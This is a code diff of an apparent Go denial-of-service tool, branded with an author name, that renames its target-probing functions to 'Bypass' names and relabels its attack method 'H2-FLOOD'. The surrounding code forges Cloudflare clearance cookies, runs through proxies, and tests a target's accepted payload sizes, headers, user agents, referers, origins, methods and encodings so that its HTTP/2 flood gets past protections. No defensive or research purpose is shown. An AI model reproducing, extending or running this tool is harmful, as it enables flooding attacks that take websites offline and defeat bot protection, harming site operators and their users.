@@ -249,7 +249,7 @@ func generateBypassCookie() string {
 	return fmt.Sprintf("cf_clearance=%s_%d-1.2.1.1-%s", randHex(22), ts, randHex(6))
 }
 
-func probeMaxPayload(target string) int {
+func BypassMaxPayload(target string) int {
 	client := &http.Client{
 		Timeout: 5 * time.Second,
 		Transport: &http.Transport{
@@ -283,7 +283,7 @@ func probeMaxPayload(target string) int {
 	return best
 }
 
-func probeMaxHeader(target string) int {
+func BypassMaxHeader(target string) int {
 	client := &http.Client{
 		Timeout: 5 * time.Second,
 		Transport: &http.Transport{
@@ -312,7 +312,7 @@ func probeMaxHeader(target string) int {
 	return best
 }
 
-func probeHeaderBypass(target, proxyIP string) map[string]bool {
+func BypassHeaderBypass(target, proxyIP string) map[string]bool {
 	client := &http.Client{
 		Timeout: 5 * time.Second,
 		Transport: &http.Transport{
@@ -367,7 +367,7 @@ func probeHeaderBypass(target, proxyIP string) map[string]bool {
 	return result
 }
 
-func probeHTTPVersion(target string) string {
+func BypassHTTPVersion(target string) string {
 	parsed, _ := url.Parse(target)
 	host := parsed.Hostname()
 	conn, err := tls.Dial("tcp", net.JoinHostPort(host, "443"), &tls.Config{
@@ -387,7 +387,7 @@ func probeHTTPVersion(target string) string {
 	return "H3"
 }
 
-func probeOrigins(target string) []string {
+func BypassOrigins(target string) []string {
 	parsed, _ := url.Parse(target)
 	host := parsed.Hostname()
 	candidates := []string{
@@ -425,7 +425,7 @@ func probeOrigins(target string) []string {
 	return valid
 }
 
-func probeUserAgents(target string) []string {
+func BypassUserAgents(target string) []string {
 	testUAs := []string{
 		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
 		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
@@ -458,7 +458,7 @@ func probeUserAgents(target string) []string {
 	return valid
 }
 
-func probeReferers(target string) []string {
+func BypassReferers(target string) []string {
 	parsed, _ := url.Parse(target)
 	host := parsed.Hostname()
 	candidates := []string{
@@ -496,7 +496,7 @@ func probeReferers(target string) []string {
 	return valid
 }
 
-func probeMethods(target string) []string {
+func BypassMethods(target string) []string {
 	methods := []string{"GET", "POST", "OPTIONS"}
 	client := &http.Client{
 		Timeout: 5 * time.Second,
@@ -530,7 +530,7 @@ func probeMethods(target string) []string {
 	return valid
 }
 
-func probeEncodings(target string) []string {
+func BypassEncodings(target string) []string {
 	encs := []string{"gzip, deflate, br", "gzip, deflate", "gzip", "br", "identity"}
 	client := &http.Client{
 		Timeout: 5 * time.Second,
@@ -558,7 +558,7 @@ func probeEncodings(target string) []string {
 	return valid
 }
 
-func probeCacheControls(target string) []string {
+func BypassCacheControls(target string) []string {
 	controls := []string{"no-cache", "no-store", "max-age=0", "must-revalidate"}
 	client := &http.Client{
 		Timeout: 5 * time.Second,
@@ -657,64 +657,64 @@ func main() {
 	fmt.Println("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 	var wg sync.WaitGroup
 	wg.Add(10)
-	probeDone := 0
-	var probeMu sync.Mutex
+	BypassDone := 0
+	var BypassMu sync.Mutex
 	printProbe := func(name string) {
-		probeMu.Lock()
-		probeDone++
-		done := probeDone
-		probeMu.Unlock()
+		BypassMu.Lock()
+		BypassDone++
+		done := BypassDone
+		BypassMu.Unlock()
 		fmt.Printf("[ Bypassed ] ▶ [ %-10s ] ▶ [ %d%% ]\n", name, (done*100)/10)
 	}
 
 	go func() {
 		defer wg.Done()
-		maxPayloadSize = probeMaxPayload(target)
+		maxPayloadSize = BypassMaxPayload(target)
 		printProbe("Payload")
 	}()
 	go func() {
 		defer wg.Done()
-		maxHeaderSize = probeMaxHeader(target)
+		maxHeaderSize = BypassMaxHeader(target)
 		printProbe("Header")
 	}()
 	go func() {
 		defer wg.Done()
-		bypassSupport = probeHeaderBypass(target, firstProxyIP)
-		printProbe("Bypass")
+		bypassSupport = BypassHeaderBypass(target, firstProxyIP)
+		printProbe("All Bypass")
 	}()
 	go func() {
 		defer wg.Done()
-		httpVersion = probeHTTPVersion(target)
+		httpVersion = BypassHTTPVersion(target)
 		printProbe("HTTP/2")
 	}()
 	go func() {
 		defer wg.Done()
-		validOrigins = probeOrigins(target)
+		validOrigins = BypassOrigins(target)
 		printProbe("Origin")
 	}()
 	go func() {
 		defer wg.Done()
-		validUserAgents = probeUserAgents(target)
+		validUserAgents = BypassUserAgents(target)
 		printProbe("UA")
 	}()
 	go func() {
 		defer wg.Done()
-		validReferers = probeReferers(target)
+		validReferers = BypassReferers(target)
 		printProbe("Referer")
 	}()
 	go func() {
 		defer wg.Done()
-		validMethods = probeMethods(target)
+		validMethods = BypassMethods(target)
 		printProbe("Method")
 	}()
 	go func() {
 		defer wg.Done()
-		validEncodings = probeEncodings(target)
+		validEncodings = BypassEncodings(target)
 		printProbe("Encoding")
 	}()
 	go func() {
 		defer wg.Done()
-		validCacheControls = probeCacheControls(target)
+		validCacheControls = BypassCacheControls(target)
 		printProbe("Cache")
 	}()
 	wg.Wait()
@@ -756,7 +756,7 @@ func main() {
 	printInfo("Author", "Diz Flyze Ofc              ", "True")
 	printInfo("Target", host, "")
 	printInfo("Port  ", "443                        ", "True")
-	printInfo("Method", "H2-FLOW                    ", "True")
+	printInfo("Method", "H2-FLOOD                   ", "True")
 	printInfo("Proxy ", fmt.Sprintf("%d                        ", len(proxies)), "True")
 	printInfo("Worker", fmt.Sprintf("%d                       ", WORKER_COUNT), "True")
 	printInfo("HTTP  ", fmt.Sprintf("%-24s   ", httpVersion), "True")
